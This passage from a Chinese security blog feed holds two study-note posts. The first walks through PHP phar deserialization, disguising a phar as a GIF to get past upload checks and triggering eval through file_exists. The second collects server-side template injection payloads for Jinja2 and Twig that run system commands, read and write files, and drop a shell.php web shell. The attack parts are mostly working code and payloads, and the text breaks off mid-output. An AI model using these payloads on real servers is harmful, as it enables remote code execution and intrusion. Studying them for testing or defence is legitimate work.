data=<span class="string">&#x27;manayakko&#x27;</span>;</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>访问后生成一个 <code>test.phar</code> 文件，</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau0sbqj304u0233ya.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau0sbqj304u0233ya.jpg" class="lazyload"></a></p>
<p>用 winhex 打开</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau3v5wj30mv08hq3l.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau3v5wj30mv08hq3l.jpg" class="lazyload"></a></p>
<p>可以明显的看到 <code>meta-data</code>是以序列化的形式存储的。<br>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过 <code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p>
<table>
<thead>
<tr>
<th>受影响的函数列表</th>
<th>——-</th>
<th>———</th>
<th>——-</th>
</tr>
</thead>
<tbody><tr>
<td>fileatime</td>
<td>filectime</td>
<td>filemtime</td>
<td>stat</td>
</tr>
<tr>
<td>fileinode</td>
<td>fileowner</td>
<td>filegroup</td>
<td>fileperms</td>
</tr>
<tr>
<td>file</td>
<td>file_get_contents</td>
<td>readfile</td>
<td>fopen</td>
</tr>
<tr>
<td>file_exists</td>
<td>is_dir</td>
<td>is_executable</td>
<td>is_file</td>
</tr>
<tr>
<td>is_link</td>
<td>is_readable</td>
<td>is_writeable</td>
<td>is_writable</td>
</tr>
<tr>
<td>parse_ini_file</td>
<td>unlink</td>
<td>copy</td>
<td>file_put_contents</td>
</tr>
</tbody></table>
<hr>
<h3 id="phar-fan-php"><a href="#phar-fan-php" class="headerlink" title="phar_fan.php"></a>phar_fan.php</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; data;   <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://test.phar&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>输出如下</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau6zpwj30mp0futa4.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau6zpwj30mp0futa4.jpg" class="lazyload"></a></p>
<hr>
<h1 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h1><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是 <code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar2.phar&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);   <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    <span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test2.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);  <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$object</span> -&gt; data = <span class="string">&#x27;Manayakko&#x27;</span>;</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>);  <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau2u46j30ep02tmx6.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau2u46j30ep02tmx6.jpg" class="lazyload"></a></p>
<p>采用这种方法可以绕过很大一部分上传检测。</p>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>phar文件要能够上传到服务器端。<br>如<code>file_exists()，fopen()，file_get_contents()，file()</code>等文件操作的函数<br>要有可用的魔术方法作为“跳板”。<br>文件操作函数的参数可控，且 <code>:</code>、<code>/</code>、<code>phar</code> 等特殊字符没有被过滤。</p>
<hr>
<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p><code>upload_file.php</code>，后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif<br><code>upload_file.html</code> 文件上传表单<br><code>file_un.php</code> 存在<code>file_exists()</code>，并且存在<code>__destruct()</code></p>
<h3 id="文件内容"><a href="#文件内容" class="headerlink" title="文件内容"></a>文件内容</h3><p><code>upload_file.php</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(<span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>))== <span class="string">&#x27;gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Upload: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Type: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Temp file: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      <span class="string">&quot;upload_file/&quot;</span> .<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Invalid file,you can only upload gif&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><code>file_un.php</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure></div>

<p><code>upload_file.html</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div></div><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost/demo/demo1/vlun/upload_file.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Upload&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><p>首先是根据file_un.php写一个生成phar的php文件，当然需要绕过gif，所以需要加GIF89a，然后我们访问这个php文件后，生成了phar.phar，修改后缀为gif，上传到服务器，然后利用file_exists，使用phar:&#x2F;&#x2F;执行代码</p>
<h2 id="构造代码"><a href="#构造代码" class="headerlink" title="构造代码"></a>构造代码</h2><p><code>eval.php</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;eval.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">AnyClass</span>();</span><br><span class="line"><span class="variable">$object</span> -&gt; output= <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure></div>

<p>访问eval.php，会在当前目录生成phar.phar，然后修改后缀 gif</p>
<p>接着上传,文件会上传到upload_file目录下</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau341pj30ix06cq31.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau341pj30ix06cq31.jpg" class="lazyload"></a></p>
<p>然后利用<code>file_un.php</code>。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">filename=phar://upload_file/eval.gif</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiauayfbj30su0epaap.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiauayfbj30su0epaap.jpg" class="lazyload"></a></p>
<p>根据以上可以知道利用条件如下</p>
<ul>
<li>phar文件要能够上传到服务器端。</li>
<li>要有可用的魔术方法作为“跳板”。</li>
<li>文件操作函数的参数可控，且 <code>:</code> <code>/</code> <code>phar</code> 等特殊字符没有被过滤。</li>
</ul>
<hr>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a><br><a href="https://blog.ripstech.com/2018/new-php-exploitation-technique/">https://blog.ripstech.com/2018/new-php-exploitation-technique/</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>code audit</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTi 模板注入笔记</title>
    <url>/yakko117/2020/04/09/SSTi_learning/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>小声bb，想玩FF7</p>
<h1 id="什么是SSTi"><a href="#什么是SSTi" class="headerlink" title="什么是SSTi"></a>什么是SSTi</h1><p><code>SSTi</code> 就是服务器端模板注入<code>(Server-Side Template Injection)</code>，也给出了一个注入的概念。<br>常见的注入有：SQL 注入，XSS 注入，XPATH 注入，XML 注入，代码注入，命令注入等等。</p>
<p><code>SSTi</code> 也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，<code>SSTi</code> 利用的是现在的网站模板引擎(下面会提到)，主要针对<code>python</code>、<code>php</code>、<code>java</code> 的一些网站处理框架，比如<strong>Python</strong> 的 <strong>jinja2 mako tornado django</strong>，<strong>Php</strong> 的 <strong>smarty twig</strong>，<strong>Java</strong> 的 <strong>jade velocity</strong>。当这些框架对运用渲染函数生成html的时候会出现 <code>SSTi</code> 的问题。</p>
<p>现在网上提起的比较多的是Python的网站。</p>
<h2 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h2><p><strong>模板引擎</strong> (这里特指用于Web开发的模板引擎)</p>
<ul>
<li>是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。</li>
<li>可以让（网站）程序实现界面与数据分离,业务代码与逻辑代码的分离，这就大大提升了开发效率，良好的设计也使得代码重用变得更加容易。</li>
</ul>
<p>也就是说，利用 <strong>模板引擎</strong> 来生成前端的 <code>html代码</code>，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成 <code>模板+用户数据</code>的 <code>前端html页面</code>，然后反馈给浏览器，呈现在用户面前。</p>
<p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p>
<h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exec webshell1</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># exec webshell2</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125; </span><br><span class="line">    <span class="comment"># poppen的参数就是要执行的命令</span></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取基本类</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">object</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行任意命令</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br></pre></td></tr></table></figure></div>

<h2 id="TWIG-全版本-通用-SSTI-payload"><a href="#TWIG-全版本-通用-SSTI-payload" class="headerlink" title="TWIG 全版本 通用 SSTI payload"></a>TWIG 全版本 通用 SSTI payload</h2><p><a href="https://xz.aliyun.com/t/7518">参考文档</a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|<span class="built_in">map</span>(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>, <span class="number">0</span>]|sort(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|<span class="built_in">filter</span>(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|reduce(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;id&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;<span class="string">&quot;&lt;?php phpinfo();&quot;</span>:<span class="string">&quot;/var/www/html/shell.php&quot;</span>&#125;|<span class="built_in">map</span>(<span class="string">&quot;file_put_contents&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="需要了解的一些东西"><a href="#需要了解的一些东西" class="headerlink" title="需要了解的一些东西"></a>需要了解的一些东西</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字符串</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__</span><br><span class="line"></span><br><span class="line"><span class="comment"># 元组</span></span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;tuple&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表</span></span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字典</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>_<em>class</em>_</strong> ：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__</span><br><span class="line">(&lt;<span class="built_in">type</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__</span><br><span class="line">(&lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__bases__</span><br><span class="line">(&lt;<span class="built_in">type</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__.__bases__</span><br><span class="line">(&lt;<span class="built_in">type</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>_<em>bases</em>_</strong> ：用来查看类的基类，也可是使用数组索引来查看特定位置的值</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">[&lt;<span class="built_in">type</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;,</span><br><span class="line"> &lt;<span class="built_in">type</span> <span class="string">&#x27;int&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;, </span><br><span class="line"> &lt;<span class="built_in">type</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;super&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;xrange&#x27;</span>&gt;, </span><br><span class="line"> &lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;set&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span 